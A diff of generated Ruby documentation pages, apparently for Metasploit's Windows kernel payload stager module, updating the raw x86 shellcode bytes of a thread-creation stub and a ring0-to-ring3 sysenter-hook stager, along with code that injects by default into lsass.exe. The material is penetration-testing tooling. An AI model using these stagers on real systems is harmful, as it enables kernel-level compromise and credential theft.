@@ -233,8 +233,9 @@ context of a user-mode system process.</p>
     
 <p>Stub to run a prepended ring3 payload in a new thread.</p>
 
-<p>Full assembly source at:
-/msf3/external/source/shellcode/windows/x86/src/single/createthread.asm</p>
+<p>Full assembly source at:</p>
+
+<pre class="code ruby"><code class="ruby"><span class='id identifier rubyid_external'>external</span><span class='op'>/</span><span class='id identifier rubyid_source'>source</span><span class='op'>/</span><span class='id identifier rubyid_shellcode'>shellcode</span><span class='op'>/</span><span class='id identifier rubyid_windows'>windows</span><span class='op'>/</span><span class='id identifier rubyid_x86'>x86</span><span class='op'>/</span><span class='id identifier rubyid_src'>src</span><span class='op'>/</span><span class='id identifier rubyid_single'>single</span><span class='op'>/</span><span class='id identifier rubyid_createthread'>createthread</span><span class='period'>.</span><span class='id identifier rubyid_asm'>asm</span></code></pre>
 
 
   </div>
@@ -248,8 +249,6 @@ context of a user-mode system process.</p>
       <pre class="lines">
 
 
-130
-131
 132
 133
 134
@@ -261,23 +260,23 @@ context of a user-mode system process.</p>
 140
 141
 142
-143</pre>
+143
+144</pre>
     </td>
     <td>
-      <pre class="code"><span class="info file"># File 'lib/rex/payloads/win32/kernel/stager.rb', line 130</span>
+      <pre class="code"><span class="info file"># File 'lib/rex/payloads/win32/kernel/stager.rb', line 132</span>
 
 <span class='kw'>def</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid__createthread'>_createthread</span>
-  <span class='id identifier rubyid_r3'>r3</span> <span class='op'>=</span>    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
-      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
-      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
-      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
-      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
-      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
-      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
-      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
-      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
-      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x31\xC0\x50\x50\x50\x8D\x9D\xA0\x00\x00\x00\x53\x50\x50\x68\x38</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
-      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x68\x0D\x16\xFF\xD5\xC3\x58</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_r3'>r3</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xFC\xE8\x82\x00\x00\x00\x60\x89\xE5\x31\xC0\x64\x8B\x50\x30\x8B</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\xAC\x3C</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF2\x52\x57\x8B\x52</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x10\x8B\x4A\x3C\x8B\x4C\x11\x78\xE3\x48\x01\xD1\x51\x8B\x59\x20</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x01\xD3\x8B\x49\x18\xE3\x3A\x49\x8B\x34\x8B\x01\xD6\x31\xFF\xAC</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF6\x03\x7D\xF8\x3B\x7D\x24\x75</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xE4\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01\xD3</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51\xFF</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xE0\x5F\x5F\x5A\x8B\x12\xEB\x8D\x5D\x31\xC0\x50\x50\x50\x8D\x9D</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x99\x00\x00\x00\x53\x50\x50\x68\x38\x68\x0D\x16\xFF\xD5\xC3\x58</span><span class='tstring_end'>&quot;</span></span>
   <span class='kw'>return</span> <span class='id identifier rubyid_r3'>r3</span>
 <span class='kw'>end</span></pre>
     </td>
@@ -316,7 +315,6 @@ run more than once.</p>
       <pre class="lines">
 
 
-154
 155
 156
 157
@@ -349,10 +347,11 @@ run more than once.</p>
 184
 185
 186
-187</pre>
+187
+188</pre>
     </td>
     <td>
-      <pre class="code"><span class="info file"># File 'lib/rex/payloads/win32/kernel/stager.rb', line 154</span>
+      <pre class="code"><span class="info file"># File 'lib/rex/payloads/win32/kernel/stager.rb', line 155</span>
 
 <span class='kw'>def</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid__run_only_in_win32proc_stub'>_run_only_in_win32proc_stub</span><span class='lparen'>(</span><span class='id identifier rubyid_append'>append</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='id identifier rubyid_opts'>opts</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
   <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>RunInWin32Process</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>lsass.exe</span><span class='tstring_end'>&quot;</span></span> <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>RunInWin32Process</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span>
@@ -493,7 +492,9 @@ handler is removed and the real ring3 payload called.</p>
 75
 76
 77
-78</pre>
+78
+79
+80</pre>
     </td>
     <td>
       <pre class="code"><span class="info file"># File 'lib/rex/payloads/win32/kernel/stager.rb', line 31</span>
@@ -517,19 +518,21 @@ handler is removed and the real ring3 payload called.</p>
 </span>  <span class='id identifier rubyid_checksum'>checksum</span>  <span class='op'>=</span> <span class='id identifier rubyid_process'>process</span><span class='lbracket'>[</span><span class='int'>0</span><span class='rbracket'>]</span> <span class='op'>+</span> <span class='lparen'>(</span> <span class='id identifier rubyid_process'>process</span><span class='lbracket'>[</span><span class='int'>2</span><span class='rbracket'>]</span> <span class='op'>&lt;&lt;</span> <span class='int'>8</span> <span class='rparen'>)</span>  <span class='op'>+</span> <span class='lparen'>(</span> <span class='id identifier rubyid_process'>process</span><span class='lbracket'>[</span><span class='int'>1</span><span class='rbracket'>]</span> <span class='op'>&lt;&lt;</span> <span class='int'>16</span> <span class='rparen'>)</span> <span class='op'>+</span> <span class='lparen'>(</span> <span class='id identifier rubyid_process'>process</span><span class='lbracket'>[</span><span class='int'>3</span><span class='rbracket'>]</span> <span class='op'>&lt;&lt;</span> <span class='int'>24</span> <span class='rparen'>)</span>
 
   <span class='comment'># The ring0 -&gt; ring3 payload blob.
-</span>  <span class='id identifier rubyid_r0'>r0</span> <span class='op'>=</span>	<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xFC\xFA\xEB\x1E\x5E\x68\x76\x01\x00\x00\x59\x0F\x32\x89\x46\x60</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
-      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8B\x7E\x64\x89\xF8\x0F\x30\xB9\x41\x41\x41\x41\xF3\xA4\xFB\xF4</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
-      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xEB\xFD\xE8\xDD\xFF\xFF\xFF\x6A\x00\x9C\x60\xE8\x00\x00\x00\x00</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
-      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x58\x8B\x58\x57\x89\x5C\x24\x24\x81\xF9\xDE\xC0\xAD\xDE\x75\x10</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
-      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x68\x76\x01\x00\x00\x59\x89\xD8\x31\xD2\x0F\x30\x31\xC0\xEB\x34</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
-      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8B\x32\x0F\xB6\x1E\x66\x81\xFB\xC3\x00\x75\x28\x8B\x58\x5F\x8D</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
-      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x5B\x6C\x89\x1A\xB8\x01\x00\x00\x80\x0F\xA2\x81\xE2\x00\x00\x10</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
-      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x00\x74\x11\xBA\x45\x45\x45\x45\x81\xC2\x04\x00\x00\x00\x81\x22</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
-      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xFF\xFF\xFF\x7F\x61\x9D\xC3\xFF\xFF\xFF\xFF\x42\x42\x42\x42\x43</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
-      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x43\x43\x43\x60\x6A\x30\x58\x99\x64\x8B\x18\x39\x53\x0C\x74\x2E</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
-      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8B\x43\x10\x8B\x40\x3C\x83\xC0\x28\x8B\x08\x03\x48\x03\x81\xF9</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
-      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x44\x44\x44\x44\x75\x18\xE8\x0A\x00\x00\x00\xE8\x10\x00\x00\x00</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
-      <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xE9\x09\x00\x00\x00\xB9\xDE\xC0\xAD\xDE\x89\xE2\x0F\x34\x61\xC3</span><span class='tstring_end'>&quot;</span></span>
+</span>  <span class='comment'># Full assembly source at:
+</span>  <span class='comment'>#   external/source/shellcode/windows/x86/src/kernel/stager_sysenter_hook.asm
+</span>  <span class='id identifier rubyid_r0'>r0</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xFC\xFA\xEB\x1E\x5E\x68\x76\x01\x00\x00\x59\x0F\x32\x89\x46\x5D</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8B\x7E\x61\x89\xF8\x0F\x30\xB9\x41\x41\x41\x41\xF3\xA4\xFB\xF4</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xEB\xFD\xE8\xDD\xFF\xFF\xFF\x6A\x00\x9C\x60\xE8\x00\x00\x00\x00</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x58\x8B\x58\x54\x89\x5C\x24\x24\x81\xF9\xDE\xC0\xAD\xDE\x75\x10</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x68\x76\x01\x00\x00\x59\x89\xD8\x31\xD2\x0F\x30\x31\xC0\xEB\x31</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8B\x32\x0F\xB6\x1E\x66\x81\xFB\xC3\x00\x75\x25\x8B\x58\x5C\x8D</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x5B\x69\x89\x1A\xB8\x01\x00\x00\x80\x0F\xA2\x81\xE2\x00\x00\x10</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x00\x74\x0E\xBA\x45\x45\x45\x45\x83\xC2\x04\x81\x22\xFF\xFF\xFF</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x7F\x61\x9D\xC3\xFF\xFF\xFF\xFF\x42\x42\x42\x42\x43\x43\x43\x43</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x60\x6A\x30\x58\x99\x64\x8B\x18\x39\x53\x0C\x74\x2B\x8B\x43\x10</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8B\x40\x3C\x83\xC0\x28\x8B\x08\x03\x48\x03\x81\xF9\x44\x44\x44</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x44\x75\x15\xE8\x07\x00\x00\x00\xE8\x0D\x00\x00\x00\xEB\x09\xB9</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+    <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xDE\xC0\xAD\xDE\x89\xE2\x0F\x34\x61\xC3</span><span class='tstring_end'>&quot;</span></span>
 
   <span class='comment'># The ring3 payload.
 </span>  <span class='id identifier rubyid_r3'>r3</span>  <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
@@ -585,8 +588,6 @@ payload.</p>
       <pre class="lines">
 
 
-91
-92
 93
 94
 95
@@ -614,10 +615,12 @@ payload.</p>
 117
 118
 119
-120</pre>
+120
+121
+122</pre>
     </td>
     <td>
-      <pre class="code"><span class="info file"># File 'lib/rex/payloads/win32/kernel/stager.rb', line 91</span>
+      <pre class="code"><span class="info file"># File 'lib/rex/payloads/win32/kernel/stager.rb', line 93</span>
 
 <span class='kw'>def</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_sud_syscall_hook'>sud_syscall_hook</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
   <span class='id identifier rubyid_r0_recovery'>r0_recovery</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>RecoveryStub</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='const'>Recovery</span><span class='period'>.</span><span class='id identifier rubyid_default'>default</span>
@@ -659,7 +662,7 @@ payload.</p>
 </div>
 
     <div id="footer">
-  Generated on Mon Dec  8 15:51:17 2014 by
+  Generated on Wed Dec 17 15:14:53 2014 by
   <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
   0.8.7.4 (ruby-2.1.5).
 </div>
